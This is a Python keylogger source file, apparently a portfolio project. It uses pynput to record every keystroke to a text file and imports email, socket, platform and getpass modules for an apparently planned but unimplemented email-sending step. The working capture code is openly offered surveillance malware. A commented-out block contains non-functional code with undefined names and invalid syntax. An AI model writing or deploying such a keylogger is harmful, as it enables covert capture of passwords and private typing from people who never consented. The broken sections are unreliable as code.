# ===============================================================
# LIBRARY IMPORT |
# ================

# Run this line in the console to install the pynput module to gain access to the keyboard interface:
# "py -m pip install pynput"
from pynput import keyboard

# Email system funtionality import.
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
import smtplib

# Collecting computer information library import.
import socket
import platform

# Used to track internal time.
import time
import os

# Getpass library to capture username.
import getpass

# Screenshot functionality, using multiprocessing freeze support to capture one screenshot at a time.
from multiprocessing import Process, freeze_support

# ===============================================================
# VARIABLES |
# ===========

# Text file.
keyFile = "keyFile.txt"

# Text file location.
filePath = "E:\\Portfolio\\Keylogger\\Keylogger-Git\\"
extend = "\\"

count = 0
keys = []

# ===============================================================
# SCRIPT START |
# ==============

""" # The keyPressed method takes in the keypresses captured as a parameter called "key".
def keyPressed(key):

    # Prints the current key capture to the terminal.
    print(str(key))

    # Appends the current key capture to the key array.
    keys.append(key)

    # Increases the keys array count by 1.
    count += 1

    # If 
    if count >= 1:
        count = orwrite_file(keys)
        keys = []

#
def writeToFile(keys):

    # Opens up a file called "keyfile.txt and the 'a' flag means to append to the file, if no file of this name exists one is automatically created.
    with open(filePath + extend + keyFile, 'a') as logKey:

        # Loop to check collected inputs for needed corrections, prior to text file formatting.
        for key in keys:

            # Removes any quotation marks.
            k = str(key).replace("'", "")

            # Moves each word to a new line every time the spacebar is pressed.
            if k.find("space") > 0:
                logKey.write('\n')
                logKey.close()

#
def keyCleaning(keys):

    #

# Formally exiting out of the keylogger program
def on_release(key):

    if key == Key.esc:

        return False
    
# Listener function
with Listener(on_press=on_press, on_release) as listener

    listener.join()

 """

# ===============================================================

# Packages up the captured string and sends it off via email.
def emailPackage():

    # Here
    print("")

# The keyPressed method takes in the keypresses captured in the "main" method as a parameter called "key".
def keyPressed(key):

    # Printing the parameter input to the terminal.
    print(str(key))

    # Opens up a file called "keyfile.txt and the 'a' flag means to append to the file, if no file of this name exists one is automatically created.
    with open("keyfile.txt", 'a') as logKey:

        # List of non-numerical and non-alphabetical keys that can be logged.
        try:

            # Spacebar.
            if key == keyboard.Key.space:
                char = " "
                logKey.write(char)

            # Main enter key
            elif key == keyboard.Key.enter:
                char = "[Enter]"
                logKey.write(char)

            # Backspace
            elif key == keyboard.Key.backspace:
                char = "[Backspace]"
                logKey.write(char)

            # Left control key (checking if the program was terminated via the terminal line).
            elif key == keyboard.Key.ctrl_l:
                char = "[left ctrl]"
                logKey.write(char)

            # Numerical and alphabetical key logging.
            else:
                char = key.char
                logKey.write(char)

        except:
            print("ERROR: Unable to record char")

# Main function
def main():

    print("[START]")

    # The listener object, the "on_press" method passes the keyboard inputs to the method keyPressed via its "key" parameter.
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

# Defines main method that launches when the script runs.
# If the "main" method is ready to fire, do the following.
if __name__ == "__main__":

    main()
